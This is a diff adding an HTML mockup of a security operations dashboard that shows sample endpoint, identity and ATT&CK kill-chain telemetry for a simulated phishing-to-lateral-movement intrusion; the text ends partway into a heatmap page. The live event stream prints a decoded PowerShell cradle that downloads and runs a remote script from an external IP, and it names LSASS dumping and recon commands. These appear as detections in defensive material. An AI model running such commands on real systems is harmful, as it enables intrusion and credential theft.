@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SENTINEL APEX — Telemetry Visibility Operations</title>
+<style>
+  :root {
+    --bg: #05080e; --bg2: #090c16; --bg3: #0c1020; --bg4: #101526;
+    --border: #172038; --border2: #1e2d48;
+    --blue: #1e90ff; --cyan: #00d4ff; --green: #00e676; --lime: #76ff03;
+    --yellow: #ffd740; --orange: #ff9800; --red: #ff4444; --pink: #ff4081;
+    --purple: #bb86fc; --teal: #00bcd4; --gold: #ffc107;
+    --text: #dde4f0; --text2: #6a7d9e; --muted: #2e3d5a;
+    --mono: 'Courier New', monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
+
+  /* NAV */
+  .nav { height: 50px; background: var(--bg2); border-bottom: 1px solid var(--border); display: flex; align-items: center; padding: 0 20px; position: sticky; top: 0; z-index: 100; gap: 0; }
+  .nav-brand { font-size: 12px; font-weight: 900; color: #fff; margin-right: 28px; letter-spacing: 0.5px; }
+  .nav-brand .hl { color: var(--cyan); }
+  .nav-tab { padding: 0 14px; height: 50px; display: flex; align-items: center; font-size: 11px; font-weight: 600; color: var(--text2); cursor: pointer; border-bottom: 2px solid transparent; letter-spacing: 0.3px; transition: all 0.15s; }
+  .nav-tab:hover { color: var(--text); }
+  .nav-tab.active { color: var(--cyan); border-bottom-color: var(--cyan); }
+  .nav-right { margin-left: auto; display: flex; gap: 8px; align-items: center; }
+  .live-badge { display: flex; align-items: center; gap: 5px; font-size: 10px; font-weight: 700; color: var(--green); background: rgba(0,230,118,0.1); border: 1px solid rgba(0,230,118,0.2); padding: 3px 9px; border-radius: 4px; }
+  .pulse { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: pulse 1.2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.7)} }
+  .nav-btn { padding: 5px 12px; border-radius: 5px; font-size: 11px; font-weight: 700; cursor: pointer; border: none; }
+  .nav-btn.primary { background: var(--cyan); color: #000; }
+
+  /* LAYOUT */
+  .layout { display: grid; grid-template-columns: 200px 1fr; height: calc(100vh - 50px); overflow: hidden; }
+  .sidebar { background: var(--bg2); border-right: 1px solid var(--border); overflow-y: auto; padding: 12px 0; }
+  .main { overflow-y: auto; }
+
+  /* SIDEBAR */
+  .sb-section { padding: 5px 14px 3px; font-size: 9px; font-weight: 800; color: var(--muted); letter-spacing: 1.2px; text-transform: uppercase; margin-top: 8px; }
+  .sb-item { display: flex; align-items: center; gap: 8px; padding: 7px 14px; font-size: 11px; color: var(--text2); cursor: pointer; border-left: 2px solid transparent; transition: all 0.12s; }
+  .sb-item:hover { background: rgba(255,255,255,0.03); color: var(--text); }
+  .sb-item.active { color: var(--cyan); background: rgba(0,212,255,0.07); border-left-color: var(--cyan); }
+  .sb-badge { margin-left: auto; font-size: 9px; font-weight: 800; padding: 2px 5px; border-radius: 10px; }
+  .bd-green { background: rgba(0,230,118,0.15); color: var(--green); }
+  .bd-orange { background: rgba(255,152,0,0.15); color: var(--orange); }
+  .bd-red { background: rgba(255,68,68,0.15); color: var(--red); }
+  .bd-cyan { background: rgba(0,212,255,0.12); color: var(--cyan); }
+  .bd-purple { background: rgba(187,134,252,0.12); color: var(--purple); }
+
+  /* TELEMETRY STATUS BAR */
+  .tel-bar { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 8px 20px; display: flex; gap: 20px; align-items: center; overflow-x: auto; }
+  .tel-stat { display: flex; align-items: center; gap: 6px; white-space: nowrap; }
+  .tel-label { font-size: 9px; color: var(--text2); font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
+  .tel-value { font-size: 12px; font-weight: 900; font-family: var(--mono); }
+  .tel-div { width: 1px; height: 24px; background: var(--border); }
+
+  /* PAGES */
+  .page { display: none; padding: 20px; }
+  .page.active { display: block; }
+
+  /* CARDS */
+  .card { background: var(--bg3); border: 1px solid var(--border); border-radius: 7px; padding: 16px; }
+  .card-title { font-size: 12px; font-weight: 700; color: var(--text); margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+  .card-sub { font-size: 10px; color: var(--text2); margin-top: 2px; }
+
+  /* GRIDS */
+  .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 16px; }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 14px; }
+  .grid-6535 { display: grid; grid-template-columns: 65fr 35fr; gap: 14px; }
+  .mb-16 { margin-bottom: 16px; }
+
+  /* KPI */
+  .kpi { background: var(--bg3); border: 1px solid var(--border); border-radius: 7px; padding: 14px 16px; position: relative; overflow: hidden; }
+  .kpi::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; }
+  .kpi.cyan::before { background: linear-gradient(90deg, var(--cyan), transparent); }
+  .kpi.green::before { background: linear-gradient(90deg, var(--green), transparent); }
+  .kpi.orange::before { background: linear-gradient(90deg, var(--orange), transparent); }
+  .kpi.red::before { background: linear-gradient(90deg, var(--red), transparent); }
+  .kpi-label { font-size: 9px; font-weight: 700; color: var(--text2); letter-spacing: 0.8px; text-transform: uppercase; }
+  .kpi-value { font-size: 26px; font-weight: 900; font-family: var(--mono); margin: 5px 0 3px; line-height: 1; }
+  .kpi-sub { font-size: 10px; color: var(--text2); }
+
+  /* TABLE */
+  .tbl { width: 100%; border-collapse: collapse; font-size: 11px; }
+  .tbl th { text-align: left; padding: 7px 10px; font-size: 9px; font-weight: 800; color: var(--text2); letter-spacing: 0.8px; text-transform: uppercase; border-bottom: 1px solid var(--border); }
+  .tbl td { padding: 8px 10px; border-bottom: 1px solid rgba(23,32,56,0.5); vertical-align: middle; }
+  .tbl tr:last-child td { border-bottom: none; }
+  .tbl tr:hover td { background: rgba(255,255,255,0.02); }
+
+  /* SEVERITY CHIPS */
+  .sev { font-size: 9px; font-weight: 800; padding: 2px 6px; border-radius: 3px; }
+  .sev-crit { background: rgba(255,68,68,0.2); color: var(--red); border: 1px solid rgba(255,68,68,0.35); }
+  .sev-high { background: rgba(255,152,0,0.2); color: var(--orange); border: 1px solid rgba(255,152,0,0.35); }
+  .sev-med { background: rgba(255,215,64,0.15); color: var(--yellow); border: 1px solid rgba(255,215,64,0.3); }
+  .sev-low { background: rgba(0,230,118,0.1); color: var(--green); border: 1px solid rgba(0,230,118,0.2); }
+
+  /* STATUS CHIPS */
+  .chip { display: inline-flex; align-items: center; gap: 4px; font-size: 9px; font-weight: 700; padding: 2px 7px; border-radius: 20px; }
+  .chip-green { background: rgba(0,230,118,0.1); color: var(--green); border: 1px solid rgba(0,230,118,0.2); }
+  .chip-red { background: rgba(255,68,68,0.1); color: var(--red); border: 1px solid rgba(255,68,68,0.2); }
+  .chip-orange { background: rgba(255,152,0,0.1); color: var(--orange); border: 1px solid rgba(255,152,0,0.2); }
+  .chip-cyan { background: rgba(0,212,255,0.1); color: var(--cyan); border: 1px solid rgba(0,212,255,0.2); }
+  .chip-purple { background: rgba(187,134,252,0.1); color: var(--purple); border: 1px solid rgba(187,134,252,0.2); }
+
+  /* PROCESS LINEAGE */
+  .process-tree { font-family: var(--mono); font-size: 11px; line-height: 1.9; }
+  .pt-root { color: var(--red); font-weight: 700; }
+  .pt-l1 { color: var(--orange); padding-left: 20px; }
+  .pt-l2 { color: var(--yellow); padding-left: 40px; }
+  .pt-l3 { color: var(--cyan); padding-left: 60px; }
+  .pt-l4 { color: var(--text2); padding-left: 80px; }
+  .pt-arrow { color: var(--muted); }
+  .pt-pid { color: var(--purple); font-size: 10px; }
+  .pt-flag { font-size: 9px; font-weight: 700; padding: 1px 5px; border-radius: 3px; margin-left: 6px; }
+  .pt-flag-malicious { background: rgba(255,68,68,0.2); color: var(--red); }
+  .pt-flag-suspicious { background: rgba(255,152,0,0.15); color: var(--orange); }
+  .pt-flag-normal { background: rgba(0,230,118,0.1); color: var(--green); }
+
+  /* EVENT STREAM */
+  .event-stream { display: flex; flex-direction: column; gap: 3px; max-height: 380px; overflow-y: auto; }
+  .event-row { display: flex; gap: 8px; padding: 7px 10px; border-radius: 4px; border: 1px solid var(--border); background: var(--bg4); font-size: 10px; align-items: flex-start; }
+  .event-row.crit { border-left: 3px solid var(--red); background: rgba(255,68,68,0.04); }
+  .event-row.high { border-left: 3px solid var(--orange); }
+  .event-row.med { border-left: 3px solid var(--yellow); }
+  .event-row.info { border-left: 3px solid var(--cyan); }
+  .ev-time { font-family: var(--mono); color: var(--text2); white-space: nowrap; }
+  .ev-host { color: var(--purple); font-weight: 700; white-space: nowrap; min-width: 120px; }
+  .ev-ttp { color: var(--cyan); font-family: var(--mono); white-space: nowrap; }
+  .ev-msg { color: var(--text); flex: 1; line-height: 1.4; }
+
+  /* ATT&CK CHAIN */
+  .attck-chain { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 10px; }
+  .attck-tactic { background: var(--bg4); border: 1px solid var(--border); border-radius: 5px; padding: 8px 12px; min-width: 100px; }
+  .tactic-name { font-size: 9px; font-weight: 800; color: var(--text2); letter-spacing: 0.5px; text-transform: uppercase; margin-bottom: 6px; }
+  .tactic-techniques { display: flex; flex-direction: column; gap: 3px; }
+  .technique-chip { font-size: 9px; font-family: var(--mono); padding: 2px 6px; border-radius: 3px; cursor: pointer; transition: all 0.12s; }
+  .t-confirmed { background: rgba(255,68,68,0.2); color: var(--red); border: 1px solid rgba(255,68,68,0.3); }
+  .t-suspected { background: rgba(255,152,0,0.15); color: var(--orange); border: 1px solid rgba(255,152,0,0.25); }
+  .t-replay { background: rgba(0,212,255,0.12); color: var(--cyan); border: 1px solid rgba(0,212,255,0.2); }
+
+  /* HEATMAP */
+  .heatmap { display: grid; grid-template-columns: repeat(24, 1fr); gap: 2px; }
+  .hm-cell { height: 18px; border-radius: 2px; cursor: pointer; transition: transform 0.1s; }
+  .hm-cell:hover { transform: scaleY(1.3); }
+  .hm-0 { background: var(--bg4); }
+  .hm-1 { background: rgba(0,212,255,0.2); }
+  .hm-2 { background: rgba(0,212,255,0.4); }
+  .hm-3 { background: rgba(255,152,0,0.5); }
+  .hm-4 { background: rgba(255,68,68,0.6); }
+  .hm-5 { background: var(--red); }
+
+  /* PROGRESS */
+  .prog-bar { height: 5px; background: var(--bg4); border-radius: 3px; overflow: hidden; }
+  .prog-fill { height: 100%; border-radius: 3px; }
+
+  /* IDENTITY TIMELINE */
+  .id-timeline { display: flex; flex-direction: column; gap: 2px; }
+  .id-event { display: flex; gap: 10px; padding: 7px 10px; border-radius: 4px; font-size: 10px; border: 1px solid var(--border); background: var(--bg4); }
+  .id-event.anomaly { border-left: 3px solid var(--red); background: rgba(255,68,68,0.04); }
+  .id-event.warning { border-left: 3px solid var(--orange); }
+  .id-user { color: var(--purple); font-weight: 700; min-width: 100px; }
+  .id-action { color: var(--text); flex: 1; }
+  .id-geo { color: var(--text2); font-family: var(--mono); }
+
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width: 3px; height: 3px; }
+  ::-webkit-scrollbar-track { background: var(--bg2); }
+  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+  .mono { font-family: var(--mono); }
+  .text2 { color: var(--text2); font-size: 10px; }
+  .flex-between { display: flex; align-items: center; justify-content: space-between; }
+  .section-label { font-size: 10px; font-weight: 800; color: var(--text2); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 10px; padding-bottom: 6px; border-bottom: 1px solid var(--border); }
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav-brand">SENTINEL APEX <span class="hl">TELEMETRY VISIBILITY OPS</span></div>
+  <div class="nav-tab active" onclick="showPage('live')">Live Stream</div>
+  <div class="nav-tab" onclick="showPage('edr')">EDR Telemetry</div>
+  <div class="nav-tab" onclick="showPage('identity')">Identity & Auth</div>
+  <div class="nav-tab" onclick="showPage('attck')">ATT&CK Chains</div>
+  <div class="nav-tab" onclick="showPage('graph')">Graph Events</div>
+  <div class="nav-tab" onclick="showPage('heatmap')">Heatmaps</div>
+  <div class="nav-right">
+    <div class="live-badge"><span class="pulse"></span>TELEMETRY LIVE</div>
+    <button class="nav-btn primary">Hunt</button>
+  </div>
+</nav>
+
+<div class="tel-bar">
+  <div class="tel-stat"><span class="tel-label">Events/s</span><span class="tel-value" style="color:var(--cyan)" id="eps">2,847</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">Endpoints</span><span class="tel-value" style="color:var(--text)">1,247</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">Active IOCs</span><span class="tel-value" style="color:var(--orange)">142</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">ATT&CK Hits</span><span class="tel-value" style="color:var(--red)" id="attck-hits">23</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">Auth Anomalies</span><span class="tel-value" style="color:var(--orange)">7</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">Graph Pivots</span><span class="tel-value" style="color:var(--purple)">18</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">Replay Hits</span><span class="tel-value" style="color:var(--cyan)">5</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">Honeynet</span><span class="tel-value" style="color:var(--yellow)">34</span></div>
+  <div class="tel-div"></div>
+  <div class="tel-stat"><span class="tel-label">P99 Ingest</span><span class="tel-value" style="color:var(--green)">12ms</span></div>
+</div>
+
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-section">Live Streams</div>
+  <div class="sb-item active" onclick="showPage('live')"><span>📡</span>Event Stream<span class="sb-badge bd-red">2.8K/s</span></div>
+  <div class="sb-item" onclick="showPage('edr')"><span>💻</span>EDR Telemetry<span class="sb-badge bd-orange">23 hits</span></div>
+  <div class="sb-item" onclick="showPage('identity')"><span>🔑</span>Identity & Auth<span class="sb-badge bd-orange">7 anom</span></div>
+  <div class="sb-section">Intelligence</div>
+  <div class="sb-item" onclick="showPage('attck')"><span>⚔</span>ATT&CK Chains<span class="sb-badge bd-red">4 active</span></div>
+  <div class="sb-item" onclick="showPage('graph')"><span>🕸</span>Graph Events<span class="sb-badge bd-cyan">18</span></div>
+  <div class="sb-item" onclick="showPage('heatmap')"><span>🌡</span>Heatmaps</div>
+  <div class="sb-section">Data Sources</div>
+  <div class="sb-item"><span>🔍</span>Process Lineage<span class="sb-badge bd-green">✓</span></div>
+  <div class="sb-item"><span>🌐</span>Network Flow<span class="sb-badge bd-green">✓</span></div>
+  <div class="sb-item"><span>📋</span>Registry Events<span class="sb-badge bd-green">✓</span></div>
+  <div class="sb-item"><span>📁</span>File System<span class="sb-badge bd-green">✓</span></div>
+  <div class="sb-item"><span>🍯</span>Honeynet<span class="sb-badge bd-purple">34</span></div>
+  <div class="sb-section">Pivots</div>
+  <div class="sb-item"><span>🔎</span>Hunt by IOC</div>
+  <div class="sb-item"><span>🎯</span>Hunt by TTP</div>
+  <div class="sb-item"><span>📊</span>Replay Pivot</div>
+</aside>
+
+<main class="main">
+
+<!-- LIVE STREAM PAGE -->
+<div class="page active" id="page-live">
+  <div class="grid-4 mb-16">
+    <div class="kpi cyan"><div class="kpi-label">Events/Second</div><div class="kpi-value" style="color:var(--cyan)" id="kpi-eps">2,847</div><div class="kpi-sub">Peak: 8,421/s (03:14 UTC)</div></div>
+    <div class="kpi orange"><div class="kpi-label">ATT&CK Hits (1h)</div><div class="kpi-value" style="color:var(--orange)">23</div><div class="kpi-sub">14 unique techniques</div></div>
+    <div class="kpi red"><div class="kpi-label">Critical Events</div><div class="kpi-value" style="color:var(--red)">3</div><div class="kpi-sub">Requiring immediate triage</div></div>
+    <div class="kpi green"><div class="kpi-label">Telemetry Coverage</div><div class="kpi-value" style="color:var(--green)">94%</div><div class="kpi-sub">1,172 / 1,247 endpoints</div></div>
+  </div>
+
+  <div class="grid-6535 mb-16">
+    <div class="card">
+      <div class="card-title">📡 Live Telemetry Event Stream <span class="chip chip-green"><span class="pulse"></span>LIVE</span></div>
+      <div class="event-stream" id="live-stream">
+        <div class="event-row crit"><span class="ev-time">03:47:22</span><span class="ev-host">WORKSTATION-047</span><span class="ev-ttp">T1055.001</span><span class="ev-msg">Process injection into lsass.exe via WriteProcessMemory. Source: svchost.exe (PID 4421). Memory region: RWX @ 0x7FF800000000.</span><span class="sev sev-crit">CRIT</span></div>
+        <div class="event-row crit"><span class="ev-time">03:47:18</span><span class="ev-host">DC-PROD-01</span><span class="ev-ttp">T1003.001</span><span class="ev-msg">LSASS memory access by non-system process. Minifilter callback triggered. Credential harvesting attempt confirmed via replay match.</span><span class="sev sev-crit">CRIT</span></div>
+        <div class="event-row high"><span class="ev-time">03:46:55</span><span class="ev-host">WORKSTATION-022</span><span class="ev-ttp">T1547.001</span><span class="ev-msg">Run key persistence: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run → C:\Users\Public\svchost32.exe. File created 47s prior.</span><span class="sev sev-high">HIGH</span></div>
+        <div class="event-row high"><span class="ev-time">03:46:41</span><span class="ev-host">FILESERVER-03</span><span class="ev-ttp">T1021.002</span><span class="ev-msg">Lateral movement via SMB: ADMIN$ share access from WORKSTATION-047 → FILESERVER-03. Mimikatz-dumped credential used. Replay confirmed.</span><span class="sev sev-high">HIGH</span></div>
+        <div class="event-row high"><span class="ev-time">03:46:22</span><span class="ev-host">WORKSTATION-047</span><span class="ev-ttp">T1059.001</span><span class="ev-msg">PowerShell encoded command execution: -EncodedCommand [base64]. Decoded: IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')</span><span class="sev sev-high">HIGH</span></div>
+        <div class="event-row med"><span class="ev-time">03:45:58</span><span class="ev-host">PROXY-GW-01</span><span class="ev-ttp">T1071.001</span><span class="ev-msg">HTTP C2 beaconing: 185.220.101.47:443, interval 60s ±jitter. User-Agent rotation detected. JA3: d0ec4b50a944b182f66af...7a1e.</span><span class="sev sev-med">MED</span></div>
+        <div class="event-row med"><span class="ev-time">03:45:31</span><span class="ev-host">WORKSTATION-047</span><span class="ev-ttp">T1566.001</span><span class="ev-msg">Initial access: spear-phishing attachment opened. Document macro execution. Parent: OUTLOOK.EXE → winword.exe → cmd.exe → powershell.exe</span><span class="sev sev-med">MED</span></div>
+        <div class="event-row info"><span class="ev-time">03:44:12</span><span class="ev-host">EDR-SENSOR-07</span><span class="ev-ttp">T1082</span><span class="ev-msg">System discovery: systeminfo.exe, net group "Domain Admins", nltest /dclist. Standard recon pattern post-initial access.</span><span class="sev sev-low">INFO</span></div>
+        <div class="event-row info"><span class="ev-time">03:43:47</span><span class="ev-host">WORKSTATION-047</span><span class="ev-ttp">T1083</span><span class="ev-msg">File discovery: dir /s /b *.xlsx *.docx *.pdf executed from cmd.exe. 847 files enumerated across 12 directories.</span><span class="sev sev-low">INFO</span></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">🌳 Process Lineage</div>
+      <div class="process-tree">
+        <div class="pt-root">OUTLOOK.EXE<span class="pt-pid">[PID 2847]</span><span class="pt-flag pt-flag-suspicious">PHISH</span></div>
+        <div class="pt-l1"><span class="pt-arrow">└─</span> WINWORD.EXE<span class="pt-pid">[PID 3121]</span><span class="pt-flag pt-flag-suspicious">MACRO</span></div>
+        <div class="pt-l2"><span class="pt-arrow">└─</span> CMD.EXE<span class="pt-pid">[PID 4287]</span><span class="pt-flag pt-flag-malicious">IOC</span></div>
+        <div class="pt-l3"><span class="pt-arrow">└─</span> POWERSHELL.EXE<span class="pt-pid">[PID 5847]</span><span class="pt-flag pt-flag-malicious">C2</span></div>
+        <div class="pt-l4"><span class="pt-arrow">├─</span> SVCHOST32.EXE<span class="pt-pid">[PID 6241]</span><span class="pt-flag pt-flag-malicious">PERSIST</span></div>
+        <div class="pt-l4"><span class="pt-arrow">└─</span> NET.EXE<span class="pt-pid">[PID 6489]</span><span class="pt-flag pt-flag-suspicious">RECON</span></div>
+      </div>
+      <div style="margin-top:14px">
+        <div class="section-label">ATT&CK Progression</div>
+        <div style="display:flex;flex-direction:column;gap:5px">
+          <div class="flex-between"><span class="text2">T1566.001 Spear-Phishing</span><span class="chip chip-red">CONFIRMED</span></div>
+          <div class="flex-between"><span class="text2">T1059.001 PowerShell</span><span class="chip chip-red">CONFIRMED</span></div>
+          <div class="flex-between"><span class="text2">T1071.001 HTTP C2</span><span class="chip chip-red">CONFIRMED</span></div>
+          <div class="flex-between"><span class="text2">T1547.001 Run Key</span><span class="chip chip-red">CONFIRMED</span></div>
+          <div class="flex-between"><span class="text2">T1003.001 LSASS Dump</span><span class="chip chip-orange">ACTIVE</span></div>
+          <div class="flex-between"><span class="text2">T1021.002 SMB Lateral</span><span class="chip chip-orange">ACTIVE</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- EDR PAGE -->
+<div class="page" id="page-edr">
+  <div class="grid-4 mb-16">
+    <div class="kpi cyan"><div class="kpi-label">Endpoints Reporting</div><div class="kpi-value" style="color:var(--cyan)">1,172</div><div class="kpi-sub">94% coverage</div></div>
+    <div class="kpi red"><div class="kpi-label">Process Anomalies</div><div class="kpi-value" style="color:var(--red)">7</div><div class="kpi-sub">3 critical — active</div></div>
+    <div class="kpi orange"><div class="kpi-label">File System Events</div><div class="kpi-value" style="color:var(--orange)">847K</div><div class="kpi-sub">Last 1 hour</div></div>
+    <div class="kpi green"><div class="kpi-label">Registry Changes</div><div class="kpi-value" style="color:var(--yellow)">142</div><div class="kpi-sub">14 persistence-related</div></div>
+  </div>
+  <div class="card mb-16">
+    <div class="card-title">EDR Process Anomaly Feed</div>
+    <table class="tbl">
+      <thead><tr><th>Time</th><th>Host</th><th>Process</th><th>Parent</th><th>TTP</th><th>Anomaly</th><th>Action</th></tr></thead>
+      <tbody>
+        <tr><td class="mono text2">03:47:22</td><td class="mono" style="color:var(--purple)">WORKSTATION-047</td><td class="mono" style="color:var(--red)">svchost32.exe</td><td class="mono text2">powershell.exe</td><td class="mono" style="color:var(--cyan)">T1055.001</td><td><span class="chip chip-red">Process Injection</span></td><td><button style="font-size:9px;padding:3px 8px;background:rgba(255,68,68,0.15);color:var(--red);border:1px solid rgba(255,68,68,0.3);border-radius:4px;cursor:pointer">Isolate</button></td></tr>
+        <tr><td class="mono text2">03:47:18</td><td class="mono" style="color:var(--purple)">DC-PROD-01</td><td class="mono" style="color:var(--red)">lsass.exe</td><td class="mono text2">services.exe</td><td class="mono" style="color:var(--cyan)">T1003.001</td><td><span class="chip chip-red">Credential Access</span></td><td><button style="font-size:9px;padding:3px 8px;background:rgba(255,68,68,0.15);color:var(--red);border:1px solid rgba(255,68,68,0.3);border-radius:4px;cursor:pointer">Isolate</button></td></tr>
+        <tr><td class="mono text2">03:46:55</td><td class="mono" style="color:var(--purple)">WORKSTATION-022</td><td class="mono" style="color:var(--orange)">reg.exe</td><td class="mono text2">cmd.exe</td><td class="mono" style="color:var(--cyan)">T1547.001</td><td><span class="chip chip-orange">Persistence</span></td><td><button style="font-size:9px;padding:3px 8px;background:rgba(187,134,252,0.12);color:var(--purple);border:1px solid rgba(187,134,252,0.2);border-radius:4px;cursor:pointer">Trace</button></td></tr>
+        <tr><td class="mono text2">03:46:41</td><td class="mono" style="color:var(--purple)">FILESERVER-03</td><td class="mono" style="color:var(--orange)">net.exe</td><td class="mono text2">cmd.exe</td><td class="mono" style="color:var(--cyan)">T1021.002</td><td><span class="chip chip-orange">Lateral Movement</span></td><td><button style="font-size:9px;padding:3px 8px;background:rgba(187,134,252,0.12);color:var(--purple);border:1px solid rgba(187,134,252,0.2);border-radius:4px;cursor:pointer">Trace</button></td></tr>
+        <tr><td class="mono text2">03:46:22</td><td class="mono" style="color:var(--purple)">WORKSTATION-047</td><td class="mono" style="color:var(--yellow)">powershell.exe</td><td class="mono text2">winword.exe</td><td class="mono" style="color:var(--cyan)">T1059.001</td><td><span class="chip chip-orange">Script Exec</span></td><td><button style="font-size:9px;padding:3px 8px;background:rgba(187,134,252,0.12);color:var(--purple);border:1px solid rgba(187,134,252,0.2);border-radius:4px;cursor:pointer">Trace</button></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- IDENTITY PAGE -->
+<div class="page" id="page-identity">
+  <div class="grid-4 mb-16">
+    <div class="kpi orange"><div class="kpi-label">Auth Anomalies</div><div class="kpi-value" style="color:var(--orange)">7</div><div class="kpi-sub">3 impossible travel</div></div>
+    <div class="kpi red"><div class="kpi-label">Privileged Escalation</div><div class="kpi-value" style="color:var(--red)">2</div><div class="kpi-sub">DA access gained</div></div>
+    <div class="kpi cyan"><div class="kpi-label">Auth Events (1h)</div><div class="kpi-value" style="color:var(--cyan)">84,721</div><div class="kpi-sub">847 failed</div></div>
+    <div class="kpi green"><div class="kpi-label">MFA Coverage</div><div class="kpi-value" style="color:var(--green)">78%</div><div class="kpi-sub">22% at risk</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title">🔑 Identity Telemetry — Anomaly Stream</div>
+    <div class="id-timeline">
+      <div class="id-event anomaly"><span class="mono text2">03:47:12</span><span class="id-user">jsmith@corp</span><span class="id-action">Domain Admin group added via net.exe post-LSASS dump. Credential origin: harvested hash. <strong style="color:var(--red)">Pass-the-Hash confirmed.</strong></span><span class="sev sev-crit">CRIT</span></div>
+      <div class="id-event anomaly"><span class="mono text2">03:45:22</span><span class="id-user">svc-backup@corp</span><span class="id-action">Service account logon from interactive session — unusual for this account type. Source: WORKSTATION-047. Lateral movement vector.</span><span class="sev sev-high">HIGH</span></div>
+      <div class="id-event warning"><span class="mono text2">03:32:18</span><span class="id-user">alee@corp</span><span class="id-action">Impossible travel: logon from US-East (03:28) then GB-London (03:32). 4-minute gap, 5,500km. Account disabled pending investigation.</span><span class="sev sev-high">HIGH</span></div>
+      <div class="id-event warning"><span class="mono text2">03:18:47</span><span class="id-user">mchen@corp</span><span class="id-action">847 failed auth attempts over 12 minutes. Distributed brute-force via Entra ID. Source IPs: 45.142.x.x (TOR). Account locked.</span><span class="sev sev-med">MED</span></div>
+      <div class="id-event"><span class="mono text2">03:08:31</span><span class="id-user">rbobson@corp</span><span class="id-action">First-time logon to FILESERVER-03 — no prior access history. Accessing \\FILESERVER-03\Finance\. Normal working hours, low risk.</span><span class="sev sev-low">INFO</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ATT&CK CHAINS PAGE -->
+<div class="page" id="page-attck">
+  <div class="card mb-16">
+    <div class="card-title">⚔ ATT&CK Kill-Chain Reconstruction — Active Campaign</div>
+    <div style="font-size:10px;color:var(--text2);margin-bottom:12px">Campaign ID: CAMP-2847 | 14 techniques confirmed | 6 tactics observed | Replay-validated: 8 techniques</div>
+    <div class="attck-chain">
+      <div class="attck-tactic">
+        <div class="tactic-name">Initial Access</div>
+        <div class="tactic-techniques">
+          <div class="technique-chip t-confirmed">T1566.001 Spear-Phishing</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);font-size:18px">→</div>
+      <div class="attck-tactic">
+        <div class="tactic-name">Execution</div>
+        <div class="tactic-techniques">
+          <div class="technique-chip t-confirmed">T1059.001 PowerShell</div>
+          <div class="technique-chip t-confirmed">T1204.002 User Execution</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);font-size:18px">→</div>
+      <div class="attck-tactic">
+        <div class="tactic-name">Persistence</div>
+        <div class="tactic-techniques">
+          <div class="technique-chip t-confirmed">T1547.001 Run Keys</div>
+          <div class="technique-chip t-replay">T1053.005 Schtasks</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);font-size:18px">→</div>
+      <div class="attck-tactic">
+        <div class="tactic-name">Priv. Escalation</div>
+        <div class="tactic-techniques">
+          <div class="technique-chip t-confirmed">T1055.001 Proc. Inject</div>
+          <div class="technique-chip t-suspected">T1134.001 Token Imperson.</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);font-size:18px">→</div>
+      <div class="attck-tactic">
+        <div class="tactic-name">Credential Access</div>
+        <div class="tactic-techniques">
+          <div class="technique-chip t-confirmed">T1003.001 LSASS</div>
+          <div class="technique-chip t-replay">T1550.002 PtH</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);font-size:18px">→</div>
+      <div class="attck-tactic">
+        <div class="tactic-name">Lateral Movement</div>
+        <div class="tactic-techniques">
+          <div class="technique-chip t-confirmed">T1021.002 SMB/WinRM</div>
+          <div class="technique-chip t-suspected">T1570 Lateral Tool</div>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;color:var(--muted);font-size:18px">→</div>
+      <div class="attck-tactic">
+        <div class="tactic-name">C2</div>
+        <div class="tactic-techniques">
+          <div class="technique-chip t-confirmed">T1071.001 HTTP</div>
+          <div class="technique-chip t-confirmed">T1132.001 Base64</div>
+        </div>
+      </div>
+    </div>
+    <div style="margin-top:12px;display:flex;gap:10px;font-size:10px">
+      <div style="display:flex;align-items:center;gap:5px"><div class="technique-chip t-confirmed" style="display:inline-block">■</div> Telemetry confirmed</div>
+      <div style="display:flex;align-items:center;gap:5px"><div class="technique-chip t-replay" style="display:inline-block">■</div> Replay validated</div>
+      <div style="display:flex;align-items:center;gap:5px"><div class="technique-chip t-suspected" style="display:inline-block">■</div> Suspected (partial evidence)</div>
+    </div>
+  </div>
+</div>
+
+<!-- HEATMAP PAGE -->
+<div class="page" id="page-heatmap">
